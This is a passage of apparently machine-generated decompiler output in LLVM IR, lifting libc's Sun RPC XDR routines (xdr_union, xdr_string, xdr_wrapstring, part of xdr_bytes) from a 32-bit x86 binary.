  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_80649ac = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v1_80649bc = icmp eq i32 %tmp, 0
  br i1 %v1_80649bc, label %dec_label_pc_8064a45, label %dec_label_pc_80649c0

dec_label_pc_80649c0:                             ; preds = %entry
  %v1_80649c4 = urem i32 %tmp, 4
  %v2_80649c4 = icmp eq i32 %v1_80649c4, 0
  br i1 %v2_80649c4, label %dec_label_pc_80649cf, label %dec_label_pc_80649c9

dec_label_pc_80649c9:                             ; preds = %dec_label_pc_80649c0
  %v2_80649cd = sub nsw i32 4, %v1_80649c4
  br label %dec_label_pc_80649cf

dec_label_pc_80649cf:                             ; preds = %dec_label_pc_80649c0, %dec_label_pc_80649c9
  %storemerge13 = phi i32 [ %v2_80649cd, %dec_label_pc_80649c9 ], [ 0, %dec_label_pc_80649c0 ]
  store i32 %storemerge13, i32* %esi.global-to-local, align 4
  %v1_80649cf = inttoptr i32 %arg2 to i32*
  %v2_80649cf = load i32, i32* %v1_80649cf, align 4
  %v9_80649d1 = icmp eq i32 %v2_80649cf, 1
  br i1 %v9_80649d1, label %dec_label_pc_80649df, label %dec_label_pc_80649d6

dec_label_pc_80649d6:                             ; preds = %dec_label_pc_80649cf
  %v5_80649d1 = icmp eq i32 %v2_80649cf, 0
  br i1 %v5_80649d1, label %dec_label_pc_8064a0c, label %dec_label_pc_80649d8

dec_label_pc_80649d8:                             ; preds = %dec_label_pc_80649d6
  %v9_80649d8 = icmp eq i32 %v2_80649cf, 2
  %v1_80649db = icmp eq i1 %v9_80649d8, false
  br i1 %v1_80649db, label %dec_label_pc_8064a43, label %dec_label_pc_8064a45

dec_label_pc_80649df:                             ; preds = %dec_label_pc_80649cf
  %v1_80649e0 = add i32 %arg2, 4
  %v2_80649e0 = inttoptr i32 %v1_80649e0 to i32*
  %v3_80649e0 = load i32, i32* %v2_80649e0, align 4
  %v5_80649e6 = add i32 %v3_80649e0, 8
  %v6_80649e6 = inttoptr i32 %v5_80649e6 to i32*
  %v7_80649e6 = load i32, i32* %v6_80649e6, align 4
  call void @__pseudo_call(i32 %v7_80649e6)
  %v1_80649ec = icmp eq i32 %v3_80649e0, 0
  br i1 %v1_80649ec, label %dec_label_pc_8064a43, label %dec_label_pc_80649f0

dec_label_pc_80649f0:                             ; preds = %dec_label_pc_80649df
  %v0_80649f0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80649f0 = icmp eq i32 %v0_80649f0, 0
  br i1 %v1_80649f0, label %dec_label_pc_8064a45, label %dec_label_pc_80649f4

dec_label_pc_80649f4:                             ; preds = %dec_label_pc_80649f0
  %v0_80649f4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80649f4 = add i32 %v0_80649f4, 4
  %v2_80649f4 = inttoptr i32 %v1_80649f4 to i32*
  %v3_80649f4 = load i32, i32* %v2_80649f4, align 4
  %v1_8064a07 = add i32 %v3_80649f4, 8
  br label %dec_label_pc_8064a37

dec_label_pc_8064a0c:                             ; preds = %dec_label_pc_80649d6
  %v1_8064a0d = add i32 %arg2, 4
  %v2_8064a0d = inttoptr i32 %v1_8064a0d to i32*
  %v3_8064a0d = load i32, i32* %v2_8064a0d, align 4
  %v5_8064a13 = add i32 %v3_8064a0d, 12
  %v6_8064a13 = inttoptr i32 %v5_8064a13 to i32*
  %v7_8064a13 = load i32, i32* %v6_8064a13, align 4
  call void @__pseudo_call(i32 %v7_8064a13)
  %v1_8064a19 = icmp eq i32 %v3_8064a0d, 0
  br i1 %v1_8064a19, label %dec_label_pc_8064a43, label %dec_label_pc_8064a1d

dec_label_pc_8064a1d:                             ; preds = %dec_label_pc_8064a0c
  %v0_8064a1d = load i32, i32* %esi.global-to-local, align 4
  %v1_8064a1d = icmp eq i32 %v0_8064a1d, 0
  br i1 %v1_8064a1d, label %dec_label_pc_8064a45, label %dec_label_pc_8064a21

dec_label_pc_8064a21:                             ; preds = %dec_label_pc_8064a1d
  %v0_8064a21 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064a21 = add i32 %v0_8064a21, 4
  %v2_8064a21 = inttoptr i32 %v1_8064a21 to i32*
  %v3_8064a21 = load i32, i32* %v2_8064a21, align 4
  %v1_8064a34 = add i32 %v3_8064a21, 12
  br label %dec_label_pc_8064a37

dec_label_pc_8064a37:                             ; preds = %dec_label_pc_80649f4, %dec_label_pc_8064a21
  %stack_var_0.0 = phi i32 [ %v0_80649f4, %dec_label_pc_80649f4 ], [ %v0_8064a21, %dec_label_pc_8064a21 ]
  %storemerge1.in.in = phi i32 [ %v1_8064a07, %dec_label_pc_80649f4 ], [ %v1_8064a34, %dec_label_pc_8064a21 ]
  %stack_var_4.0 = phi i32 [ ptrtoint (i32* @global_var_807e03c.756 to i32), %dec_label_pc_80649f4 ], [ ptrtoint (i32* @global_var_806f03d.757 to i32), %dec_label_pc_8064a21 ]
  %storemerge1.in = inttoptr i32 %storemerge1.in.in to i32*
  %storemerge1 = load i32, i32* %storemerge1.in, align 4
  store i32 %storemerge1, i32* @ecx, align 4
  %v2_8064a38 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8064a38, i32* %ebx.global-to-local, align 4
  store i32 %v0_80649ac, i32* %esi.global-to-local, align 4
  call void @__pseudo_branch(i32 %storemerge1)
  br label %dec_label_pc_8064a45

dec_label_pc_8064a43:                             ; preds = %dec_label_pc_8064a0c, %dec_label_pc_80649df, %dec_label_pc_80649d8
  br label %dec_label_pc_8064a45

dec_label_pc_8064a45:                             ; preds = %dec_label_pc_8064a37, %entry, %dec_label_pc_80649f0, %dec_label_pc_8064a1d, %dec_label_pc_80649d8, %dec_label_pc_8064a43
  %stack_var_0.1 = phi i32 [ %arg1, %entry ], [ %arg1, %dec_label_pc_8064a43 ], [ %arg1, %dec_label_pc_80649f0 ], [ %stack_var_0.0, %dec_label_pc_8064a37 ], [ %arg1, %dec_label_pc_8064a1d ], [ %arg1, %dec_label_pc_80649d8 ]
  %stack_var_4.1 = phi i32 [ %arg2, %entry ], [ %arg2, %dec_label_pc_8064a43 ], [ %arg2, %dec_label_pc_80649f0 ], [ %stack_var_4.0, %dec_label_pc_8064a37 ], [ %arg2, %dec_label_pc_8064a1d ], [ %arg2, %dec_label_pc_80649d8 ]
  %storemerge = phi i32 [ 1, %entry ], [ 0, %dec_label_pc_8064a43 ], [ 1, %dec_label_pc_80649f0 ], [ 1, %dec_label_pc_8064a37 ], [ 1, %dec_label_pc_8064a1d ], [ 1, %dec_label_pc_80649d8 ]
  store i32 %stack_var_0.1, i32* @ebx, align 4
  store i32 %stack_var_4.1, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_80649cf, { 0, 2, 1 }
  uselistorder i32 %v1_80649c4, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 4, 6, 5, 7, 8 }
  uselistorder label %dec_label_pc_8064a45, { 5, 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_8064a37, { 1, 0 }
  uselistorder label %dec_label_pc_80649cf, { 1, 0 }
}

define i32 @xdr_union(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8064a49 = load i32, i32* @ebp, align 4
  %v0_8064a4a = load i32, i32* @edi, align 4
  %v0_8064a4c = load i32, i32* @ebx, align 4
  store i32 %v0_8064a4c, i32* %stack_var_-16, align 4
  store i32 %tmp11, i32* %edi.global-to-local, align 4
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  %v2_8064a6a = call i32 @xdr_enum(i32 %arg1, i32 %tmp11)
  %v1_8064a72 = icmp eq i32 %v2_8064a6a, 0
  br i1 %v1_8064a72, label %dec_label_pc_8064ac1, label %dec_label_pc_8064a76

dec_label_pc_8064a76:                             ; preds = %entry
  %v0_8064a76 = load i32, i32* %edi.global-to-local, align 4
  %v1_8064a76 = inttoptr i32 %v0_8064a76 to i32*
  %v2_8064a76 = load i32, i32* %v1_8064a76, align 4
  %v0_8064a97.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064a9723 = add i32 %v0_8064a97.pre, 4
  %v2_8064a9724 = inttoptr i32 %v1_8064a9723 to i32*
  %v3_8064a9725 = load i32, i32* %v2_8064a9724, align 4
  store i32 %v3_8064a9725, i32* @ecx, align 4
  %v1_8064a9a26 = icmp eq i32 %v3_8064a9725, 0
  %v1_8064a9c27 = icmp eq i1 %v1_8064a9a26, false
  br i1 %v1_8064a9c27, label %dec_label_pc_8064a7a, label %dec_label_pc_8064a9e

dec_label_pc_8064a7a:                             ; preds = %dec_label_pc_8064a76, %dec_label_pc_8064a94
  %v3_8064a9729 = phi i32 [ %v3_8064a97, %dec_label_pc_8064a94 ], [ %v3_8064a9725, %dec_label_pc_8064a76 ]
  %v0_8064a9428 = phi i32 [ %v1_8064a94, %dec_label_pc_8064a94 ], [ %v0_8064a97.pre, %dec_label_pc_8064a76 ]
  %v1_8064a7a = inttoptr i32 %v0_8064a9428 to i32*
  %v2_8064a7a = load i32, i32* %v1_8064a7a, align 4
  %v14_8064a7a = icmp eq i32 %v2_8064a7a, %v2_8064a76
  %v1_8064a7c = icmp eq i1 %v14_8064a7a, false
  br i1 %v1_8064a7c, label %dec_label_pc_8064a94, label %dec_label_pc_8064a7e

dec_label_pc_8064a7e:                             ; preds = %dec_label_pc_8064a7a
  br label %dec_label_pc_8064ab8

dec_label_pc_8064a94:                             ; preds = %dec_label_pc_8064a7a
  %v1_8064a94 = add i32 %v0_8064a9428, 8
  store i32 %v1_8064a94, i32* %ebx.global-to-local, align 4
  %v1_8064a97 = add i32 %v0_8064a9428, 12
  %v2_8064a97 = inttoptr i32 %v1_8064a97 to i32*
  %v3_8064a97 = load i32, i32* %v2_8064a97, align 4
  store i32 %v3_8064a97, i32* @ecx, align 4
  %v1_8064a9a = icmp eq i32 %v3_8064a97, 0
  %v1_8064a9c = icmp eq i1 %v1_8064a9a, false
  br i1 %v1_8064a9c, label %dec_label_pc_8064a7a, label %dec_label_pc_8064a9e

dec_label_pc_8064a9e:                             ; preds = %dec_label_pc_8064a94, %dec_label_pc_8064a76
  %v1_8064a9e = icmp eq i32 %arg5, 0
  br i1 %v1_8064a9e, label %dec_label_pc_8064ac1, label %dec_label_pc_8064aa2

dec_label_pc_8064aa2:                             ; preds = %dec_label_pc_8064a9e
  store i32 %arg5, i32* @ecx, align 4
  br label %dec_label_pc_8064ab8

dec_label_pc_8064ab8:                             ; preds = %dec_label_pc_8064a7e, %dec_label_pc_8064aa2
  %v0_8064abf = phi i32 [ %v3_8064a9729, %dec_label_pc_8064a7e ], [ %arg5, %dec_label_pc_8064aa2 ]
  %v2_8064abb = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8064abb, i32* %ebx.global-to-local, align 4
  store i32 %v0_8064a4a, i32* %edi.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_8064abf)
  br label %dec_label_pc_8064ac1

dec_label_pc_8064ac1:                             ; preds = %dec_label_pc_8064a9e, %entry, %dec_label_pc_8064ab8
  %v2_8064ac6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8064ac6, i32* %ebx.global-to-local, align 4
  store i32 %v0_8064a4a, i32* @edi, align 4
  store i32 %v0_8064a49, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_8064a97, { 1, 2, 0 }
  uselistorder i32 %v1_8064a94, { 1, 0 }
  uselistorder i32 %v0_8064a9428, { 0, 2, 1 }
  uselistorder i32 %v0_8064a4a, { 1, 0 }
  uselistorder void (i32)* @__pseudo_branch, { 3, 5, 6, 1, 2, 0, 4 }
  uselistorder i32 (i32, i32)* @xdr_enum, { 4, 5, 1, 3, 6, 2, 0 }
  uselistorder i32 %arg5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8064ac1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064ab8, { 1, 0 }
  uselistorder label %dec_label_pc_8064a7a, { 1, 0 }
}

define i32 @__GI_xdr_string(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp16 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8064acb = load i32, i32* @edi, align 4
  %v0_8064acc = load i32, i32* @esi, align 4
  %v0_8064acd = load i32, i32* @ebx, align 4
  store i32 %tmp16, i32* @esi, align 4
  store i32 %arg2, i32* @edi, align 4
  %v2_8064ad9 = load i32, i32* %arg1, align 4
  store i32 %v2_8064ad9, i32* %eax.global-to-local, align 4
  %v1_8064adb = inttoptr i32 %arg2 to i32*
  %v2_8064adb = load i32, i32* %v1_8064adb, align 4
  %v1_8064add = icmp eq i32 %v2_8064ad9, 0
  br i1 %v1_8064add, label %dec_label_pc_8064aef, label %dec_label_pc_8064ae1

dec_label_pc_8064ae1:                             ; preds = %entry
  %v9_8064ae1 = icmp eq i32 %v2_8064ad9, 2
  %v1_8064ae4 = icmp eq i1 %v9_8064ae1, false
  br i1 %v1_8064ae4, label %dec_label_pc_8064ae1.dec_label_pc_8064b07_crit_edge, label %dec_label_pc_8064ae6

dec_label_pc_8064ae1.dec_label_pc_8064b07_crit_edge: ; preds = %dec_label_pc_8064ae1
  br label %dec_label_pc_8064b07

dec_label_pc_8064ae6:                             ; preds = %dec_label_pc_8064ae1
  %v1_8064ae6 = icmp eq i32 %v2_8064adb, 0
  %v1_8064ae8 = icmp eq i1 %v1_8064ae6, false
  br i1 %v1_8064ae8, label %dec_label_pc_8064af7, label %dec_label_pc_8064b99

dec_label_pc_8064aef:                             ; preds = %entry
  %v1_8064aef = icmp eq i32 %v2_8064adb, 0
  br i1 %v1_8064aef, label %dec_label_pc_8064ba0, label %dec_label_pc_8064af7

dec_label_pc_8064af7:                             ; preds = %dec_label_pc_8064aef, %dec_label_pc_8064ae6
  %v5_8064afa = inttoptr i32 %v2_8064adb to i8*
  %v3_8064afb = call i32 @strlen(i8* %v5_8064afa)
  store i32 %v3_8064afb, i32* %eax.global-to-local, align 4
  store i32 %v3_8064afb, i32* %stack_var_-16, align 4
  %v0_8064b0e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8064b07

dec_label_pc_8064b07:                             ; preds = %dec_label_pc_8064ae1.dec_label_pc_8064b07_crit_edge, %dec_label_pc_8064af7
  %v0_8064b0e = phi i32 [ %tmp16, %dec_label_pc_8064ae1.dec_label_pc_8064b07_crit_edge ], [ %v0_8064b0e.pre, %dec_label_pc_8064af7 ]
  %v2_8064b09 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8064b09, i32* @eax, align 4
  %tmp27 = inttoptr i32 %v0_8064b0e to i32*
  %v6_8064b0f = call i32 @xdr_u_long(i32* %tmp27, i32 %v2_8064b09)
  store i32 %v6_8064b0f, i32* %eax.global-to-local, align 4
  %v1_8064b17 = icmp eq i32 %v6_8064b0f, 0
  br i1 %v1_8064b17, label %dec_label_pc_8064ba0, label %dec_label_pc_8064b1f

dec_label_pc_8064b1f:                             ; preds = %dec_label_pc_8064b07
  %v3_8064b1f = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_8064b1f, i32* %eax.global-to-local, align 4
  %v6_8064b27 = icmp ugt i32 %v3_8064b1f, %arg3
  br i1 %v6_8064b27, label %dec_label_pc_8064ba0, label %dec_label_pc_8064b29

dec_label_pc_8064b29:                             ; preds = %dec_label_pc_8064b1f
  %v0_8064b29 = load i32, i32* @esi, align 4
  %v1_8064b29 = inttoptr i32 %v0_8064b29 to i32*
  %v2_8064b29 = load i32, i32* %v1_8064b29, align 4
  %v9_8064b2b = icmp eq i32 %v2_8064b29, 1
  br i1 %v9_8064b2b, label %dec_label_pc_8064b39, label %dec_label_pc_8064b30

dec_label_pc_8064b30:                             ; preds = %dec_label_pc_8064b29
  %v5_8064b2b = icmp eq i32 %v2_8064b29, 0
  br i1 %v5_8064b2b, label %dec_label_pc_8064b72, label %dec_label_pc_8064b32

dec_label_pc_8064b32:                             ; preds = %dec_label_pc_8064b30
  %v9_8064b32 = icmp eq i32 %v2_8064b29, 2
  %v1_8064b35 = icmp eq i1 %v9_8064b32, false
  br i1 %v1_8064b35, label %dec_label_pc_8064ba0, label %dec_label_pc_8064b83

dec_label_pc_8064b39:                             ; preds = %dec_label_pc_8064b29
  %v1_8064b39 = add i32 %v3_8064b1f, 1
  %v8_8064b39 = icmp eq i32 %v1_8064b39, 0
  store i32 %v1_8064b39, i32* %eax.global-to-local, align 4
  br i1 %v8_8064b39, label %dec_label_pc_8064b99, label %dec_label_pc_8064b3c

dec_label_pc_8064b3c:                             ; preds = %dec_label_pc_8064b39
  %v0_8064b3c = load i32, i32* @ebx, align 4
  %v1_8064b3c = icmp eq i32 %v0_8064b3c, 0
  %v1_8064b3e = icmp eq i1 %v1_8064b3c, false
  br i1 %v1_8064b3e, label %dec_label_pc_8064b6a, label %dec_label_pc_8064b40

dec_label_pc_8064b40:                             ; preds = %dec_label_pc_8064b3c
  %v2_8064b44 = call i32 @malloc(i32 %v1_8064b39)
  store i32 %v2_8064b44, i32* %eax.global-to-local, align 4
  %v1_8064b4c = icmp eq i32 %v2_8064b44, 0
  store i32 %v2_8064b44, i32* @ebx, align 4
  %v1_8064b50 = load i32, i32* @edi, align 4
  %v2_8064b50 = inttoptr i32 %v1_8064b50 to i32*
  store i32 %v2_8064b44, i32* %v2_8064b50, align 4
  %v1_8064b52 = icmp eq i1 %v1_8064b4c, false
  br i1 %v1_8064b52, label %dec_label_pc_8064b40.dec_label_pc_8064b6a_crit_edge, label %dec_label_pc_8064b54

dec_label_pc_8064b40.dec_label_pc_8064b6a_crit_edge: ; preds = %dec_label_pc_8064b40
  %v3_8064b6a.pre = load i32, i32* %stack_var_-16, align 4
  %v0_8064b6e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8064b6a

dec_label_pc_8064b54:                             ; preds = %dec_label_pc_8064b40
  %v0_8064b56 = load i32, i32* @global_var_80753f0, align 16
  %v3_8064b61 = call i32 @__GI_fputs(i32 ptrtoint ([27 x i8]* @global_var_806f008.758 to i32), i32 %v0_8064b56)
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064b7e

dec_label_pc_8064b6a:                             ; preds = %dec_label_pc_8064b40.dec_label_pc_8064b6a_crit_edge, %dec_label_pc_8064b3c
  %v0_8064b6e = phi i32 [ %v0_8064b6e.pre, %dec_label_pc_8064b40.dec_label_pc_8064b6a_crit_edge ], [ %v0_8064b3c, %dec_label_pc_8064b3c ]
  %v3_8064b6a = phi i32 [ %v3_8064b6a.pre, %dec_label_pc_8064b40.dec_label_pc_8064b6a_crit_edge ], [ %v3_8064b1f, %dec_label_pc_8064b3c ]
  store i32 %v3_8064b6a, i32* %eax.global-to-local, align 4
  %v2_8064b6e = add i32 %v3_8064b6a, %v0_8064b6e
  %v3_8064b6e = inttoptr i32 %v2_8064b6e to i8*
  store i8 0, i8* %v3_8064b6e, align 1
  %v3_8064b73.pre = load i32, i32* %stack_var_-16, align 4
  %v0_8064b78.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8064b72

dec_label_pc_8064b72:                             ; preds = %dec_label_pc_8064b30, %dec_label_pc_8064b6a
  %v0_8064b78 = phi i32 [ %v0_8064b29, %dec_label_pc_8064b30 ], [ %v0_8064b78.pre, %dec_label_pc_8064b6a ]
  %v3_8064b73 = phi i32 [ %v3_8064b1f, %dec_label_pc_8064b30 ], [ %v3_8064b73.pre, %dec_label_pc_8064b6a ]
  %v0_8064b77 = load i32, i32* @ebx, align 4
  %v5_8064b79 = call i32 @xdr_opaque(i32 %v0_8064b78, i32 %v0_8064b77, i32 %v3_8064b73)
  store i32 %v5_8064b79, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064b7e

dec_label_pc_8064b7e:                             ; preds = %dec_label_pc_8064b83, %dec_label_pc_8064b54, %dec_label_pc_8064b72
  %v0_8064ba8.pre = phi i32 [ %v0_8064ba8.pre.pre, %dec_label_pc_8064b83 ], [ 0, %dec_label_pc_8064b54 ], [ %v5_8064b79, %dec_label_pc_8064b72 ]
  br label %dec_label_pc_8064ba2

dec_label_pc_8064b83:                             ; preds = %dec_label_pc_8064b32
  %v0_8064b86 = load i32, i32* @ebx, align 4
  %v2_8064b87 = call i32 @free(i32 %v0_8064b86)
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_8064b91 = load i32, i32* @edi, align 4
  %v1_8064b91 = inttoptr i32 %v0_8064b91 to i32*
  store i32 0, i32* %v1_8064b91, align 4
  %v0_8064ba8.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064b7e

dec_label_pc_8064b99:                             ; preds = %dec_label_pc_8064ae6, %dec_label_pc_8064b39
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064ba2

dec_label_pc_8064ba0:                             ; preds = %dec_label_pc_8064b32, %dec_label_pc_8064b1f, %dec_label_pc_8064b07, %dec_label_pc_8064aef
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064ba2

dec_label_pc_8064ba2:                             ; preds = %dec_label_pc_8064b99, %dec_label_pc_8064b7e, %dec_label_pc_8064ba0
  %v0_8064ba8 = phi i32 [ 1, %dec_label_pc_8064b99 ], [ %v0_8064ba8.pre, %dec_label_pc_8064b7e ], [ 0, %dec_label_pc_8064ba0 ]
  store i32 %v0_8064acd, i32* @ebx, align 4
  store i32 %v0_8064acc, i32* @esi, align 4
  store i32 %v0_8064acb, i32* @edi, align 4
  ret i32 %v0_8064ba8

; uselistorder directives
  uselistorder i32 %v2_8064b44, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8064b29, { 0, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 1, 2, 4, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8064ba2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064b99, { 1, 0 }
  uselistorder label %dec_label_pc_8064b7e, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8064b72, { 1, 0 }
  uselistorder label %dec_label_pc_8064b07, { 1, 0 }
}

define i32 @xdr_wrapstring(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8064bb6 = inttoptr i32 %arg1 to i32*
  %v4_8064bb6 = call i32 @__GI_xdr_string(i32* %v3_8064bb6, i32 %arg2, i32 -1)
  %v1_8064bbb = icmp eq i32 %v4_8064bb6, 0
  %v1_8064bbd = icmp eq i1 %v1_8064bbb, false
  %v2_8064bbd = zext i1 %v1_8064bbd to i32
  ret i32 %v2_8064bbd
}

define i32 @xdr_bytes(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp10 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8064bc7 = load i32, i32* @ebp, align 4
  %v0_8064bc8 = load i32, i32* @edi, align 4
  %v0_8064bc9 = load i32, i32* @esi, align 4
  %v0_8064bca = load i32, i32* @ebx, align 4
  store i32 %v0_8064bca, i32* %stack_var_-16, align 4
  store i32 %arg4, i32* @eax, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %tmp10, i32* @edi, align 4
  %v6_8064be7 = call i32 @xdr_u_long(i32* %arg1, i32 %arg3)
  store i32 %v6_8064be7, i32* %eax.global-to-local, align 4
  %v1_8064bef = icmp eq i32 %v6_8064be7, 0
  br i1 %v1_8064bef, label %dec_label_pc_8064c7d, label %dec_label_pc_8064bf7

dec_label_pc_8064bf7:                             ; preds = %entry
  %v0_8064bf7 = load i32, i32* %esi.global-to-local, align 4
  %v1_8064bf7 = inttoptr i32 %v0_8064bf7 to i32*
  %v2_8064bf7 = load i32, i32* %v1_8064bf7, align 4
  store i32 %v2_8064bf7, i32* @esi, align 4
  %tmp = icmp ugt i32 %v2_8064bf7, %arg4
  %v0_8064c04.pre = load i32, i32* @edi, align 4
  %v1_8064c04.phi.trans.insert = inttoptr i32 %v0_8064c04.pre to i32*
  %v2_8064c04.pre = load i32, i32* %v1_8064c04.phi.trans.insert, align 4
  br i1 %tmp, label %dec_label_pc_8064bff, label %dec_label_pc_8064c04

dec_label_pc_8064bff:                             ; preds = %dec_label_pc_8064bf7
  %v11_8064bff = icmp eq i32 %v2_8064c04.pre, 2
  %v1_8064c02 = icmp eq i1 %v11_8064bff, false
  br i1 %v1_8064c02, label %dec_label_pc_8064c7d, label %dec_label_pc_8064c04

dec_label_pc_8064c04:                             ; preds = %dec_label_pc_8064bf7, %dec_label_pc_8064bff
  store i32 %v2_8064c04.pre, i32* %eax.global-to-local, align 4
  %v9_8064c06 = icmp eq i32 %v2_8064c04.pre, 1
  br i1 %v9_8064c06, label %dec_label_pc_8064c14, label %dec_label_pc_8064c0b

dec_label_pc_8064c0b:                             ; preds = %dec_label_pc_8064c04
  %v5_8064c06 = icmp eq i32 %v2_8064c04.pre, 0
  br i1 %v5_8064c06, label %dec_label_pc_8064c47, label %dec_label_pc_8064c0d

dec_label_pc_8064c0d:                             ; preds = %dec_label_pc_8064c0b
  %v9_8064c0d = icmp eq i32 %v2_8064c04.pre, 2
  %v1_8064c10 = icmp eq i1 %v9_8064c0d, false
  br i1 %v1_8064c10, label %dec_label_pc_8064c7d, label %dec_label_pc_8064c5f

dec_label_pc_8064c14:                             ; preds = %dec_label_pc_8064c04
  %v1_8064c14 = icmp eq i32 %v2_8064bf7, 0
  br i1 %v1_8064c14, label %dec_label_pc_8064c81, label %dec_label_pc_8064c18

dec_label_pc_8064c18:                             ; preds = %dec_label_pc_8064c14
  %v0_8064c18 = load i32, i32* @ebx, align 4
  %v1_8064c18 = icmp eq i32 %v0_8064c18, 0
  %v1_8064c1a = icmp eq i1 %v1_8064c18, false
  br i1 %v1_8064c1a, label %dec_label_pc_8064c47, label %dec_label_pc_8064c1c

dec_label_pc_8064c1c:                             ; preds = %dec_label_pc_8064c18
  %v2_8064c20 = call i32 @malloc(i32 %v2_8064bf7)
  store i32 %v2_8064c20, i32* %eax.global-to-local, align 4
  %v1_8064c28 = icmp eq i32 %v2_8064c20, 0
  store i32 %v2_8064c20, i32* @ebx, align 4
  %v1_8064c2c = load i32, i32* @ebp, align 4
  %v2_8064c2c = inttoptr i32 %v1_8064c2c to i32*
  store i32 %v2_8064c20, i32* %v2_8064c2c, align 4
  %v1_8064c2f = icmp eq i1 %v1_8064c28, false
  br i1 %v1_8064c2f, label %dec_label_pc_8064c1c.dec_label_pc_8064c47_crit_edge, label %dec_label_pc_8064c31

dec_label_pc_8064c1c.dec_label_pc_8064c47_crit_edge: ; preds = %dec_label_pc_8064c1c
  %v0_8064c4f.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8064c47

dec_label_pc_8064c31:                             ; preds = %dec_label_pc_8064c1c
  %v0_8064c33 = load i32, i32* @global_var_80753f0, align 16
  %v3_8064c3e = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_806f023.759 to i32), i32 %v0_8064c33)
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064c78

dec_label_pc_8064c47:                             ; preds = %dec_label_pc_8064c1c.dec_label_pc_8064c47_crit_edge, %dec_label_pc_8064c18, %dec_label_pc_8064c0b
  %v0_8064c4f = phi i32 [ %v0_8064c4f.pre, %dec_label_pc_8064c1c.dec_label_pc_8064c47_crit_edge ], [ %v0_8064c04.pre, %dec_label_pc_8064c18 ], [ %v0_8064c04.pre, %dec_label_pc_8064c0b ]
  %v0_8064c4b = load i32, i32* @ebx, align 4
  %v2_8064c56 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8064c56, i32* @ebx, align 4
  store i32 %v0_8064bc9, i32* @esi, align 4
  store i32 %v0_8064bc8, i32* @edi, align 4
  store i32 %v0_8064bc7, i32* @ebp, align 4
  %v3_8064c5a = call i32 @xdr_opaque(i32 %v0_8064c4f, i32 %v0_8064c4b, i32 %v2_8064bf7)
  store i32 %v3_8064c5a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064c5f

dec_label_pc_8064c5f:                             ; preds = %dec_label_pc_8064c0d, %dec_label_pc_8064c47
  %v0_8064c5f = load i32, i32* @ebx, align 4
  %v1_8064c5f = icmp eq i32 %v0_8064c5f, 0
  br i1 %v1_8064c5f, label %dec_label_pc_8064c81, label %dec_label_pc_8064c63

dec_label_pc_8064c63:                             ; preds = %dec_label_pc_8064c5f
  %v2_8064c67 = call i32 @free(i32 %v0_8064c5f)
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_8064c71 = load i32, i32* @ebp, align 4
  %v1_8064c71 = inttoptr i32 %v0_8064c71 to i32*
  store i32 0, i32* %v1_8064c71, align 4
  %v0_8064c8d.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064c78

dec_label_pc_8064c78:                             ; preds = %dec_label_pc_8064c31, %dec_label_pc_8064c63
  %v0_8064c8d.pre = phi i32 [ 0, %dec_label_pc_8064c31 ], [ %v0_8064c8d.pre.pre, %dec_label_pc_8064c63 ]
  br label %dec_label_pc_8064c86

